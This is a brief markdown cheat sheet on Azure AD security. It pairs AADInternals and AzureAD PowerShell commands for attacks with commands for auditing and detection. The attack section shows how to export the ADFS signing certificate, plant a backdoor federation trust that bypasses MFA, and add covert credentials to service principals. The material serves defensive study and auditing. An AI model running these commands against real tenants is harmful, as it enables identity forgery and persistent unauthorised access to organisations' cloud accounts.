# AzureAD Security 

Quick notes on Azure AD security  

## Setting up a lab

## Attacks

### Export ADFS certificate
Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  

#### More info 

$ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
$conn = $ADFS.ConfigurationDatabaseConnectionString  
$SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
$SQLclient.Open()  
$SQLcmd = $SQLclient.CreateCommand()  
$SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
$SQLreader = $SQLcmd.ExecuteReader()  
$SQLreader.Read() | Out-Null  
$settings=$SQLreader.GetTextReader(0).ReadToEnd()  
$SQLreader.Dispose()  
\[xml\]$xml=$settings  

### Adding a malicious federation trust
Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
get-msoluser | select UserPrincipalName, ImmutableId  
Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  

(AuditLogs | where OperationName =~ "Set domain authentication")  

## Adding credentials to a service principle 

### Certificate 
$cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
$sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  

### Password
New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  

## Create a new service principle 
Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null}  
$sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  

## Defence 

### Auditing federation trusts
Connect-MsolService  
Get-MsolDomain | Select * / Get-AzureADDomain | Select *  
Get-MsolFederationProperty (need to run this for each domain)  

### Auditing service principles
Connect-AzureAD  
Get-AzureADServicePrincipal  
Get-AzureADServicePrincipal -all $true | Select *  
Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null}  
Get-AzureADServicePrincipal -all $true | Where-Object{$_.PasswordCredentials -ne $null}  

### Sentinel connectors
AzureActiveDirectory  
SecurityEvents  
Office365  
Microsoft 365 Defender  

### Other useful commands
Get-AADIntLoginInformation -Domain domain.com  
Get-AzureADTenantDetail | Select *  

### Sparrow
https://github.com/cisagov/Sparrow/blob/develop/Sparrow.ps1  
Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing  


